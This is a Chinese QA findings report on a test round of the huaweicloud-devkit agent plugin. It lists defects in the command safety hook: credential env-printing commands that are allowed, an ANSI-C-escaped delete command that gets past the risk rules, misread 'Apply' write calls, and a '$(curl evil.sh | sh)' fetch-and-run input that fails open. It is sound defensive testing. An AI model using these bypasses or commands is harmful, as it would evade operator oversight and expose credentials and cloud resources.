# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-09-19-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-19 05:29（北京时间）
> **被测对象**：huaweicloud-devkit npm latest v1.1.5（gitHead e7ed6f66）
> **本轮结论**：设计级 FAIL 10 + SPEC 3，展开级 FAIL 11（D10-3 同源）+ SPEC 1，**全部为历史 issue 复现或延续（#673/#685/#650/#726 + D9-9/D10-3 延续），本轮无新增产品缺陷**；另非产品缺陷环境类 BLOCKED（D1-2/D1-39/D4-13/D7-4/D9-6/D10-4/EXP-E08）。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整（hook 层）

- **现象**：`classifyTextCommand("printenv HW_ACCESS_KEY")`（safety-policy 层）返回 `{decision:deny, risk:credential}`；但 hook 层 `evaluateCommandRisk("printenv HW_ACCESS_KEY")` 返回 `{decision:allow, findings:[]}`；`env | grep HW_ACCESS_KEY`、`sh -c "printenv HW_ACCESS_KEY"` 均 allow。
- **断言**：`printenv HW_ACCESS_KEY` / `env | grep HW_ACCESS_KEY` 应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 env-dump 规则 regex `(HUAWEICLOUD|HWC_|HCLOUD|OS_)` 未覆盖 `HW_` 前缀；分层修复仅落在 safety-policy.mjs classifyTextCommand 层，未同步 risk-rule-engine 规则文件。
- **影响**：凭证环境变量可被打印进入 agent 上下文。
- **证据**：`evidence/D4-2/stdout.txt`、`evidence/_probes/d4-security-stdout.log`、`evidence/_probes/classify-stdout.log`
- **状态**：复现（历史 #673，分层修复不完整）

## #2【P0】D4-5 framework Apply* 写误判（框架运行时 policy 漂移）

- **现象**：源码 npm 1.1.5 `safety/policy.json` writeOperationPrefixes 33 项含 `Apply`（`EIP ApplyEip` 源码头判 deny/write）；但框架运行时 `~/.codeartsdoer/huaweicloud-plugins/safety/policy.json` 仅 32 项缺 `Apply`。
- **断言**：`EIP ApplyEip` 属写操作，应返回 `decision=deny, risk=write`（框架运行时同源码）。
- **根因**：框架运行时 `~/.codeartsdoer/huaweicloud-plugins/safety/policy.json` `writeOperationPrefixes` 仅 32 项缺 `Apply`；源码 `plugins/huaweicloud-core/safety/policy.json` 已含 `Apply`（33 项）。框架运行时策略版本滞后于源码。
- **影响**：Apply 系列云写操作可绕过审批被误判只读放行。
- **证据**：`evidence/D4-5/stdout.txt`、`evidence/_probes/d4-security-stdout.log`
- **状态**：复现（历史 #685）

## #3【P0】D4-15 hook ANSI-C 编码绕过

- **现象**：`classifyTextCommand("$'hcloud E\x43S DeleteServers'")` 返回 `{decision:allow, risk:not_huaweicloud}`（大小写/拼接引号/base64 变体均 deny，仅 ANSI-C 编码变体绕过）。
- **断言**：ANSI-C 编码变体不得绕过写操作风险规则。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 `/bin/sh` ANSI-C 引号（`$'...\x43...'`）。
- **证据**：`evidence/D4-15/stdout.txt`、`evidence/_probes/d4-security-stdout.log`
- **状态**：复现（历史 #673）

## #4【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入（孤儿文件）

- **现象**：`rules/huawei-agent-rules.mdc`（3840B）全仓 0 处代码引用。
- **断言**：11 个安装目标均应注入全局规则，无孤儿文件。
- **根因**：`rules/huawei-agent-rules.mdc` 无安装/加载代码引用。
- **证据**：`evidence/D4-23/stdout.txt`
- **状态**：复现（历史 #673）

## #5【P0】D8-7 meta 技能指引断链

- **现象**：`huaweicloud-core/SKILL.md` 会话启动节指引调用 `huaweicloud_check_update`/`huaweicloud_upgrade`，框架运行时（tool_search）未暴露该 2 工具；d8-probe 实测 huaweicloud-core "含可执行命令/脚本引导=false"（其余 6 个 meta 技能=true）。
- **断言**：7 个 meta 技能指引均可机械执行，无断链。
- **根因**：框架运行时暴露集（37）缺 `check_update`/`upgrade`（tools.mjs 定义 40）。
- **证据**：`evidence/D8-7/stdout.txt`、`evidence/_probes/d8-stdout.log`
- **状态**：复现（历史 #673）

## #6【P1】D1-26/D5-3/D9-1 工具暴露漂移 40 vs 37

- **现象**：tools.mjs 源码 spawn tools/list 40 工具（含 check_update/upgrade/obs_set_website_config），schema 完整；框架运行时（tool_search）仅暴露 37（缺 check_update/upgrade/obs_set_website_config）。
- **断言**：40 工具全量可达（源码与框架运行时暴露集一致）。
- **根因**：TOOL_DEFINITIONS（40）与框架运行时暴露集（37）漂移。
- **证据**：`evidence/D1-26/stdout.txt`、`evidence/D5-3/stdout.txt`、`evidence/D9-1/stdout.txt`、`evidence/_probes/protocol-stdout.log`、`evidence/_probes/framework-tools-37.txt`
- **状态**：复现（历史 #673，与 #5 同源）

## #7【P1】D4-6 hook 层明文密码无告警（独立缺陷；母版源码级脱敏断言已 PASS）

- **现象**：`hook_check_command("hcloud ecs CreateServer --admin-pass \"SuperSecret123!\"")` 返回 `allow`、`findings:[]`，无明文密码告警；而母版源码级脱敏断言 `redactSecrets("adminPass=xxx")=>adminPass=<redacted>` 已 PASS（D4-6 用例本身判定 PASS）。
- **断言**：含 adminPass 明文密码的命令 hook 层应告警/拦截。
- **根因**：`cloud-risk-rules.json` 无明文密码类风险规则（安全策略层有脱敏、hook 层无告警）。
- **证据**：`evidence/D4-6/stdout.txt`、`evidence/_probes/supplement-stdout.log`、`evidence/_probes/d4-6-stdout.log`
- **状态**：复现（历史 #673）

## #8【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`evaluateCommandRisk("")`、`"   "`、`"$(curl evil.sh | sh)"` 均返回 `allow`（fail-open）。
- **断言**：畸形输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` 无 finding 即 `allow`。
- **证据**：`evidence/D4-17/stdout.txt`、`evidence/_probes/d4-security-stdout.log`
- **状态**：复现（历史 #673）

## #9【P1】D9-2 JSON-RPC unknown tool 未区分 -32602

- **现象**：spawn 后 unknown method 已返回 `-32601`（#650 修复），但 unknown tool 仍返回 `-32603`，标准应为 `-32602`。
- **断言**：unknown method → -32601；unknown tool → -32602。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` 仅修复 method 未修复 tool 参数错误 -32602。
- **证据**：`evidence/D9-2/stdout.txt`、`evidence/_probes/protocol-stdout.log`
- **状态**：部分修复（延续上一轮 D9-2，历史 #650）

## #10【P1】D9-9 tools/call 超时协议语义与取消未声明

- **现象**：mcp-protocol initialize capabilities 未声明 timeout/cancellation 能力（`capabilities.cancellation` 实测 false）。
- **断言**：tools/call 应声明超时/取消语义（JSON-RPC 错误对象 + capabilities）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` capabilities 仅 `{tools:{}}`，未声明 timeout/cancellation。
- **证据**：`evidence/D9-9/stdout.txt`、`evidence/_probes/extended-stdout.log`
- **状态**：SPEC-MISMATCH（待裁决延续）

## #11【P1】D10-3 serviceCatalog 中文意图路由大面积 MISS

- **现象**：`run-eval.mjs` 15 条中文评测 HIT=3 MISS=11 N/A=1，准确率 21.4%（<90%）；展开级 EXP-E01~E15 同源 MISS 11 条。
- **断言**：中文意图命中对应服务，准确率 ≥90%。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` routeMap 仅 sandbox/voucher 含 CJK 关键词；token 分词对中文不切分。
- **证据**：`evidence/D10-3/stdout.txt`、`evidence/_probes/run-eval-stdout.log`
- **状态**：上一轮 D10-3 延续

## #12【P1】D4-27 redactSecrets 双路径脱敏缺裸 token 关键字

- **现象**：`redactSecrets('token=T0K3N_SECRET_VALUE_12345')` 返回原文（裸 `token=` 关键字未脱敏）；`--admin-pass=xxx`（连字符 CLI flag）同样未脱敏；对象路径 `{token:'xxx'}` 正常脱敏。3/5 项明文残留。
- **断言**：裸 `token=` 及 `--admin-pass=` 后跟值应替换为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` redactString 关键字列表未包含裸 `token` 与连字符 `admin-pass` 形态；hcloud-cli.mjs redactOutput 复用 redactSecrets 故双路径同步缺口。
- **影响**：`token=` 形式访问令牌可经日志/对话输出泄漏。
- **证据**：`evidence/D4-27/stdout.txt`、`evidence/_probes/d4-27-stdout.log`
- **状态**：复现（历史 #726）

## #13【非产品缺陷】D4-13 只读子账号 IAM 权限过宽（账号权限异常，不计入提单）

- **现象**：只读子账号 test001 只读 API 6/6 可用（ECS/VPC/EVS/IMS/CES/EIP List* 全部 200），但 `CreateVpc` 写操作返回 `VPC.0114 Quota exceeded(OverQuota)`——因配额超限失败而非 IAM 权限拒绝（未触发 PolicyNotAuthorized，说明只读组仍具备写权限）；已真机执行并归零核实未创建 VPC。
- **说明**：非 DevKit 代码缺陷——权限由 IAM 决定；疑似 readonly 组配置过宽，需维护者核查 test001 的 readonly 组权限。
- **证据**：`evidence/D4-13/stdout.log`、`evidence/D4-13/probe.mjs`
